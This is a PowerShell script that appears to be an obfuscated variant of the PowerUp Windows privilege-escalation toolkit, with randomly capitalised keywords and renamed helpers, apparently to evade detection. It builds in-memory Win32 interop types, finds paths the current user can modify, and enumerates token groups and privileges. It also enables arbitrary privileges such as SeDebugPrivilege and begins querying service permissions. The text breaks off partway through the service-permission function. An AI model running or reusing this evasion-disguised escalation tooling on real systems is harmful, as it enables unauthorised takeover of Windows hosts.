#Requires -Version 2

fUnCtIoN nEw-InMEmOrYMoDuLe {

    [DIaGnOStiCs.CodEAnaLYsiS.sUppReSsMeSSaGeAtTrIbUte('PSUsEshOuLdPrOceSsFoRsTatEChAnGinGFuNcTiOnS', '')]
    [CmdlEtBiNdInG()]
    pArAm (
        [pArAmEtEr(pOsItIoN = 0)]
        [vAlIdAtEnOtNuLlOrEmPtY()]
        [sTrInG]
        $MoDuLeNaMe = [gUiD]::nEwGuId().tOsTrInG()
    )

    $ApPdOmAiN = [rEfLeCtIoN.aSsEmBlY].aSsEmBlY.gEtTyPe(('SyStEm.'+'ApPdOmAiN')).gEtPrOpErTy(('CuRrEnT'+'DoMaIn')).gEtVaLuE($nUlL, @())
    $LoAdEdAsSeMbLiEs = $ApPdOmAiN.gEtAsSeMbLiEs()

    fOrEaCh ($AsSeMbLy in $LoAdEdAsSeMbLiEs) {
        iF ($AsSeMbLy.fUlLnAmE -aNd ($AsSeMbLy.fUlLnAmE.sPlIt(',')[0] -eQ $MoDuLeNaMe)) {
            rEtUrN $AsSeMbLy
        }
    }

    $dYnAsSeMbLy = nEw-oBjEcT rEfLeCtIoN.aSsEmBlYnAmE($MoDuLeNaMe)
    $dOmAiN = $ApPdOmAiN
    $AsSeMbLyBuIlDeR = $dOmAiN.dEfInEdYnAmIcAsSeMbLy($dYnAsSeMbLy, 'RuN')
    $MoDuLeBuIlDeR = $AsSeMbLyBuIlDeR.dEfInEdYnAmIcMoDuLe($MoDuLeNaMe, $fAlSe)

    rEtUrN $MoDuLeBuIlDeR
}

fUnCtIoN fUNC {
    pArAm (
        [pArAmEtEr(pOsItIoN = 0, mAnDaToRy = $TrUe)]
        [sTrInG]
        $DllNAMe,

        [pArAmEtEr(pOsItIoN = 1, mAnDaToRy = $TrUe)]
        [sTrInG]
        $FuncNAME,

        [pArAmEtEr(pOsItIoN = 2, mAnDaToRy = $TrUe)]
        [tYpE]
        $RetTYPE,

        [pArAmEtEr(pOsItIoN = 3)]
        [tYpE[]]
        $ParamTYPES,

        [pArAmEtEr(pOsItIoN = 4)]
        [rUnTiMe.iNtErOpSeRvIcEs.cAlLiNgCoNvEnTiOn]
        $NatCALLCONV,

        [pArAmEtEr(pOsItIoN = 5)]
        [rUnTiMe.iNtErOpSeRvIcEs.cHaRsEt]
        $CHARset,

        [sTrInG]
        $EntryPNT,

        [sWiTcH]
        $SetERR
    )

    $Props = @{
        DllNAMe = $DllNAMe
        FuncNAME = $FuncNAME
        RetTYPE = $RetTYPE
    }

    iF ($ParamTYPES) { $Props['ParamTYPES'] = $ParamTYPES }
    iF ($NatCALLCONV) { $Props['NatCALLCONV'] = $NatCALLCONV }
    iF ($CHARset) { $Props['CHARset'] = $CHARset }
    iF ($SetERR) { $Props['SetERR'] = $SetERR }
    iF ($EntryPNT) { $Props['EntryPNT'] = $EntryPNT }

    nEw-oBjEcT pSoBjEcT -PrOpErTy $Props
}

fUnCtIoN Add-Win32TYP {

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllNAMe,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FuncNAME,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPNT,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $RetTYPE,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParamTYPES,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NatCALLCONV = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $CHARset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetERR,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Modul,

        [ValidateNotNull()]
        [String]
        $Namespac = ''
    )

    BEGIN
    {
        $TypeHSH = @{}
    }

    PROCESS
    {
        if ($Modul -is [Reflection.Assembly])
        {
            if ($Namespac)
            {
                $TypeHSH[$DllNAMe] = $Modul.GetType("$Namespac.$DllNAMe")
            }
            else
            {
                $TypeHSH[$DllNAMe] = $Modul.GetType($DllNAMe)
            }
        }
        else
        {
            if (!$TypeHSH.ContainsKey($DllNAMe))
            {
                if ($Namespac)
                {
                    $TypeHSH[$DllNAMe] = $Modul.DefineType("$Namespac.$DllNAMe", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHSH[$DllNAMe] = $Modul.DefineType($DllNAMe, 'Public,BeforeFieldInit')
                }
            }

            $Meth = $TypeHSH[$DllNAMe].DefineMethod(
                $FuncNAME,
                'Public,Static,PinvokeImpl',
                $RetTYPE,
                $ParamTYPES)

            $i = 1
            foreach($Param in $ParamTYPES)
            {
                if ($Param.IsByRef)
                {
                    [void] $Meth.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImp = [Runtime.InteropServices.DllImportAttribute]
            $SetErrField = $DllImp.GetField('SetLastError')
            $CallConvField = $DllImp.GetField('CallingConvention')
            $CharField = $DllImp.GetField('CharSet')
            $EntryField = $DllImp.GetField('EntryPoint')
            if ($SetERR) { $SLEVal = $True } else { $SLEVal = $False }

            if ($PSBoundParameters['EntryPNT']) { $ExportFuncName = $EntryPNT } else { $ExportFuncName = $FuncNAME }

            $Constr = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImpAttr = New-Object Reflection.Emit.CustomAttributeBuilder($Constr,
                $DllNAMe, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetErrField,
                                           $CallConvField,
                                           $CharField,
                                           $EntryField),
                [Object[]] @($SLEVal,
                             ([Runtime.InteropServices.CallingConvention] $NatCALLCONV),
                             ([Runtime.InteropServices.CharSet] $CHARset),
                             $ExportFuncName))

            $Meth.SetCustomAttribute($DllImpAttr)
        }
    }

    END
    {
        if ($Modul -is [Reflection.Assembly])
        {
            return $TypeHSH
        }

        $RetTyps = @{}

        foreach ($Key in $TypeHSH.Keys)
        {
            $Typ = $TypeHSH[$Key].CreateType()

            $RetTyps[$Key] = $Typ
        }

        return $RetTyps
    }
}

fUnCtIoN psENUM {

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Modul,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullNAM,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Typ,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumELMS,

        [Switch]
        $BitFLD
    )

    if ($Modul -is [Reflection.Assembly])
    {
        return ($Modul.GetType($FullNAM))
    }

    $EnumTYP = $Typ -as [Type]

    $EnumBLD = $Modul.DefineEnum($FullNAM, 'Public', $EnumTYP)

    if ($BitFLD)
    {
        $FlagsConstr = [FlagsAttribute].GetConstructor(@())
        $FlagsCustAttr = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstr, @())
        $EnumBLD.SetCustomAttribute($FlagsCustAttr)
    }

    foreach ($Key in $EnumELMS.Keys)
    {
        $null = $EnumBLD.DefineLiteral($Key, $EnumELMS[$Key] -as $EnumTYP)
    }

    $EnumBLD.CreateType()
}

fUnCtIoN fIELD {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Posit,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Typ,

        [Parameter(Position = 2)]
        [UInt16]
        $Offst,

        [Object[]]
        $MarshAL
    )

    @{
        Posit = $Posit
        Typ = $Typ -as [Type]
        Offst = $Offst
        MarshAL = $MarshAL
    }
}

fUnCtIoN strUCT{
[OutputType([Type])]
Param (
[Parameter(Position = 1, Mandatory=$True)]
[ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
$Modul,
[Parameter(Position = 2, Mandatory=$True)]
[ValidateNotNullOrEmpty()]
[String]
$FullNAM,
[Parameter(Position = 3, Mandatory=$True)]
[ValidateNotNullOrEmpty()]
[Hashtable]
$StructFLDS,
[Reflection.Emit.PackingSize]
$PackSZ = [Reflection.Emit.PackingSize]::Unspecified,
[Switch]
$ExplLAYOUT
)
if ($Modul -is [Reflection.Assembly]){return ($Modul.GetType($FullNAM))}
[Reflection.TypeAttributes] $StructATTR = 'AnsiClass,Class,Public,Sealed,BeforeFieldInit'
if ($ExplLAYOUT){$StructATTR = $StructATTR -bor [Reflection.TypeAttributes]::ExplicitLayout}
else{$StructATTR = $StructATTR -bor [Reflection.TypeAttributes]::SequentialLayout}
$StructBLD = $Modul.DefineType($FullNAM, $StructATTR, [ValueType], $PackSZ)
$ConstrInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
$SizeCnst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
$FLDS = New-Object Hashtable[]($StructFLDS.Count)
foreach ($FLD in $StructFLDS.Keys){
$Indx = $StructFLDS[$FLD]['Position']
$FLDS[$Indx] = @{FieldName = $FLD; Properties = $StructFLDS[$FLD]}
}
foreach ($FLD in $FLDS){
$FLDName = $FLD['FieldName']
$FLDProp = $FLD['Properties']
$Offst = $FLDProp['Offset']
$Typ = $FLDProp['Type']
$MarshAL = $FLDProp['MarshalAs']
$NewFLD = $StructBLD.DefineField($FLDName, $Typ, 'Public')
if ($MarshAL){
$UnmanType = $MarshAL[0] -as ([Runtime.InteropServices.UnmanagedType])
if ($MarshAL[1]){
$Sz = $MarshAL[1]
$AttrBLD = New-Object Reflection.Emit.CustomAttributeBuilder($ConstrInfo,$UnmanType, $SizeCnst, @($Sz))
}
else{
$AttrBLD = New-Object Reflection.Emit.CustomAttributeBuilder($ConstrInfo, [Object[]] @($UnmanType))
}
$NewFLD.SetCustomAttribute($AttrBLD)
}
if ($ExplLAYOUT) { $NewFLD.SetOffset($Offst) }
}
$SizeMeth = $StructBLD.DefineMethod('GetSize','Public, Static',[Int],[Type[]] @())
$ILGen = $SizeMeth.GetILGenerator()
$ILGen.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBLD)
$ILGen.Emit([Reflection.Emit.OpCodes]::Call,[Type].GetMethod('GetTypeFromHandle'))
$ILGen.Emit([Reflection.Emit.OpCodes]::Call,[Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
$ILGen.Emit([Reflection.Emit.OpCodes]::Ret)
$ImplConv = $StructBLD.DefineMethod('op_Implicit','PrivateScope, Public, Static, HideBySig, SpecialName',$StructBLD,[Type[]] @([IntPtr]))
$ILGen2 = $ImplConv.GetILGenerator()
$ILGen2.Emit([Reflection.Emit.OpCodes]::Nop)
$ILGen2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
$ILGen2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBLD)
$ILGen2.Emit([Reflection.Emit.OpCodes]::Call,[Type].GetMethod('GetTypeFromHandle'))
$ILGen2.Emit([Reflection.Emit.OpCodes]::Call,[Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
$ILGen2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBLD)
$ILGen2.Emit([Reflection.Emit.OpCodes]::Ret)
$StructBLD.CreateType()
}

fUnCtIoN Get-ModifiablePath {
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[OutputType('PowerUp.ModifiablePath')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('FullName')]
[String[]]
$Path,
[Alias('LiteralPaths')]
[Switch]
$Literal
)
BEGIN {
$AccessMask = @{
[uint32]'0x80000000' = 'GenericRead'
[uint32]'0x40000000' = 'GenericWrite'
[uint32]'0x20000000' = 'GenericExecute'
[uint32]'0x10000000' = 'GenericAll'
[uint32]'0x02000000' = 'MaximumAllowed'
[uint32]'0x01000000' = 'AccessSystemSecurity'
[uint32]'0x00100000' = 'Synchronize'
[uint32]'0x00080000' = 'WriteOwner'
[uint32]'0x00040000' = 'WriteDAC'
[uint32]'0x00020000' = 'ReadControl'
[uint32]'0x00010000' = 'Delete'
[uint32]'0x00000100' = 'WriteAttributes'
[uint32]'0x00000080' = 'ReadAttributes'
[uint32]'0x00000040' = 'DeleteChild'
[uint32]'0x00000020' = 'Execute/Traverse'
[uint32]'0x00000010' = 'WriteExtendedAttributes'
[uint32]'0x00000008' = 'ReadExtendedAttributes'
[uint32]'0x00000004' = 'AppendData/AddSubdirectory'
[uint32]'0x00000002' = 'WriteData/AddFile'
[uint32]'0x00000001' = 'ReadData/ListDirectory'
}
$UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
$CurrentUserSids += $UserIdentity.User.Value
$TranslatedIdentityReferences = @{}
}
PROCESS {
ForEach($TargetPath in $Path) {
$CandidatePaths = @()
$SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
if ($PSBoundParameters['Literal']) {
$TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))
if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
$CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
}
else {
$ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
if ($ParentPath -and (Test-Path -Path $ParentPath)) {
$CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
}
}
}
else {
ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
$TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
if (($SeparationCharacterSet -notmatch ' ')) {
$TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
if ($TempPath -and ($TempPath -ne '')) {
if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
$CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
}
else {
try {
$ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
$CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
}
}
catch {}
}
}
}
else {
$CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
}
}
}
}
$CandidatePaths | Sort-Object -Unique | ForEach-Object {
$CandidatePath = $_
Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
$FileSystemRights = $_.FileSystemRights.value__
$Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }
$Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
if ($Comparison) {
if ($_.IdentityReference -notmatch '^S-1-5.*') {
if (-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
$IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
$TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
}
$IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
}
else {
$IdentitySID = $_.IdentityReference
}
if ($CurrentUserSids -contains $IdentitySID) {
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
$Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
$Out | Add-Member Noteproperty 'Permissions' $Permissions
$Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
$Out
}
}
}
}
}
}
}

fUnCtIoN Get-TokenInformation {
[OutputType('PowerUp.TokenGroup')]
[OutputType('PowerUp.TokenPrivilege')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
[Alias('hToken', 'Token')]
[ValidateNotNullOrEmpty()]
[IntPtr]
$TokenHandle,
[String[]]
[ValidateSet('Groups', 'Privileges', 'Type')]
$InformationClass = 'Privileges'
)
PROCESS {
if ($InformationClass -eq 'Groups') {
$TokenGroupsPtrSize = 0
$Success = $Advapi32::GetTokenInformation($TokenHandle, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)
[IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)
$Success = $Advapi32::GetTokenInformation($TokenHandle, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Success) {
$TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS
For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
if ($TokenGroups.Groups[$i].SID) {
$SidString = ''
$Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Result -eq 0) {
Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
}
else {
$GroupSid = New-Object PSObject
$GroupSid | Add-Member Noteproperty 'SID' $SidString
$GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
$GroupSid | Add-Member Noteproperty 'TokenHandle' $TokenHandle
$GroupSid.PSObject.TypeNames.Insert(0, 'PowerUp.TokenGroup')
$GroupSid
}
}
}
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
}
elseif ($InformationClass -eq 'Privileges') {
$TokenPrivilegesPtrSize = 0
$Success = $Advapi32::GetTokenInformation($TokenHandle, 3, 0, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize)
[IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesPtrSize)
$Success = $Advapi32::GetTokenInformation($TokenHandle, 3, $TokenPrivilegesPtr, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Success) {
$TokenPrivileges = $TokenPrivilegesPtr -as $TOKEN_PRIVILEGES
For ($i=0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {
$Privilege = New-Object PSObject
$Privilege | Add-Member Noteproperty 'Privilege' $TokenPrivileges.Privileges[$i].Luid.LowPart.ToString()
$Privilege | Add-Member Noteproperty 'Attributes' ($TokenPrivileges.Privileges[$i].Attributes -as $LuidAttributes)
$Privilege | Add-Member Noteproperty 'TokenHandle' $TokenHandle
$Privilege.PSObject.TypeNames.Insert(0, 'PowerUp.TokenPrivilege')
$Privilege
}
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
}
else {
$TokenResult = New-Object PSObject
$TokenTypePtrSize = 0
$Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenTypePtrSize, [ref]$TokenTypePtrSize)
[IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypePtrSize)
$Success = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenTypePtr, $TokenTypePtrSize, [ref]$TokenTypePtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Success) {
$Temp = $TokenTypePtr -as $TOKEN_TYPE
$TokenResult | Add-Member Noteproperty 'Type' $Temp.Type
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)
$TokenImpersonationLevelPtrSize = 0
$Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize)
[IntPtr]$TokenImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenImpersonationLevelPtrSize)
$Success2 = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenImpersonationLevelPtr, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Success2) {
$Temp = $TokenImpersonationLevelPtr -as $IMPERSONATION_LEVEL
$TokenResult | Add-Member Noteproperty 'ImpersonationLevel' $Temp.ImpersonationLevel
$TokenResult | Add-Member Noteproperty 'TokenHandle' $TokenHandle
$TokenResult.PSObject.TypeNames.Insert(0, 'PowerUp.TokenType')
$TokenResult
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenImpersonationLevelPtr)
}
}
}

fUnCtIoN Get-ProcessTokenGroup {
[OutputType('PowerUp.TokenGroup')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('ProcessID')]
[UInt32]
[ValidateNotNullOrEmpty()]
$Id
)
PROCESS {
if ($PSBoundParameters['Id']) {
$ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($ProcessHandle -eq 0) {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
else {
$ProcessID = $Id
}
}
else {
$ProcessHandle = $Kernel32::GetCurrentProcess()
$ProcessID = $PID
}
if ($ProcessHandle) {
[IntPtr]$hProcToken = [IntPtr]::Zero
$TOKEN_QUERY = 0x0008
$Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Success) {
$TokenGroups = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Groups'
$TokenGroups | ForEach-Object {
$_ | Add-Member Noteproperty 'ProcessId' $ProcessID
$_
}
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
if ($PSBoundParameters['Id']) {
$Null = $Kernel32::CloseHandle($ProcessHandle)
}
}
}
}

fUnCtIoN GEt-ProcesStoKeNpRiViLEGe {
[OutputType('PowerUp.TokenPrivilege')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('ProcessID')]
[UInt32]
[ValidateNotNullOrEmpty()]
$Id,
[Switch]
[Alias('Privileged')]
$Special
)
BEGIN {
$SpecialPrivileges = @('SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege', 'SeSystemEnvironmentPrivilege', 'SeImpersonatePrivilege', 'SeTcbPrivilege')
}
PROCESS {
if ($PSBoundParameters['Id']) {
$ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($ProcessHandle -eq 0) {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
else {
$ProcessID = $Id
}
}
else {
$ProcessHandle = $Kernel32::GetCurrentProcess()
$ProcessID = $PID
}
if ($ProcessHandle) {
[IntPtr]$hProcToken = [IntPtr]::Zero
$TOKEN_QUERY = 0x0008
$Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Success) {
Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
if ($PSBoundParameters['Special']) {
if ($SpecialPrivileges -Contains $_.Privilege) {
$_ | Add-Member Noteproperty 'ProcessId' $ProcessID
$_ | Add-Member Aliasproperty Name ProcessId
$_
}
}
else {
$_ | Add-Member Noteproperty 'ProcessId' $ProcessID
$_
}
}
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
if ($PSBoundParameters['Id']) {
$Null = $Kernel32::CloseHandle($ProcessHandle)
}
}
}
}

fUnCtIoN Get-ProcessTokenType {
[OutputType('PowerUp.TokenType')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('ProcessID')]
[UInt32]
[ValidateNotNullOrEmpty()]
$Id
)
PROCESS {
if ($PSBoundParameters['Id']) {
$ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($ProcessHandle -eq 0) {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
else {
$ProcessID = $Id
}
}
else {
$ProcessHandle = $Kernel32::GetCurrentProcess()
$ProcessID = $PID
}
if ($ProcessHandle) {
[IntPtr]$hProcToken = [IntPtr]::Zero
$TOKEN_QUERY = 0x0008
$Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Success) {
$TokenType = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Type'
$TokenType | ForEach-Object {
$_ | Add-Member Noteproperty 'ProcessId' $ProcessID
$_
}
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
if ($PSBoundParameters['Id']) {
$Null = $Kernel32::CloseHandle($ProcessHandle)
}
}
}
}

fUnCtIoN enAble-PRIVILEGE {
[CmdletBinding()]
Param(
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('Privileges')]
[ValidateSet('SeCreateTokenPrivilege', 'SeAssignPrimaryTokenPrivilege', 'SeLockMemoryPrivilege', 'SeIncreaseQuotaPrivilege', 'SeUnsolicitedInputPrivilege', 'SeMachineAccountPrivilege', 'SeTcbPrivilege', 'SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeSystemProfilePrivilege', 'SeSystemtimePrivilege', 'SeProfileSingleProcessPrivilege', 'SeIncreaseBasePriorityPrivilege', 'SeCreatePagefilePrivilege', 'SeCreatePermanentPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeShutdownPrivilege', 'SeDebugPrivilege', 'SeAuditPrivilege', 'SeSystemEnvironmentPrivilege', 'SeChangeNotifyPrivilege', 'SeRemoteShutdownPrivilege', 'SeUndockPrivilege', 'SeSyncAgentPrivilege', 'SeEnableDelegationPrivilege', 'SeManageVolumePrivilege', 'SeImpersonatePrivilege', 'SeCreateGlobalPrivilege', 'SeTrustedCredManAccessPrivilege', 'SeRelabelPrivilege', 'SeIncreaseWorkingSetPrivilege', 'SeTimeZonePrivilege', 'SeCreateSymbolicLinkPrivilege')]
[String[]]
$Privilege
)
PROCESS {
ForEach ($Priv in $Privilege) {
[UInt32]$PreviousState = 0
Write-Verbose "Attempting to enable $Priv"
$Success = $NTDll::RtlAdjustPrivilege($SecurityEntity::$Priv, $True, $False, [ref]$PreviousState)
if ($Success -ne 0) {
Write-Warning "RtlAdjustPrivilege for $Priv failed: $Success"
}
}
}
}

fUnCtIoN Add-ServiceDacl {
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[OutputType('ServiceProcess.ServiceController')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('ServiceName')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name
)
BEGIN {
filter Local:Get-ServiceReadControlHandle {
[OutputType([IntPtr])]
Param(
[Parameter(Mandatory = $True, ValueFromPipeline = $True)]
[ValidateNotNullOrEmpty()]
[ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
$Service
)
$GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
$ReadControl = 0x00020000
$RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))
$RawHandle
}
}
PROCESS {
ForEach($ServiceName in $Name) {
$IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop
try {
Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
$ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
}
catch {
$ServiceHandle = $Null
Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
}
if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
$SizeNeeded = 0
$Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
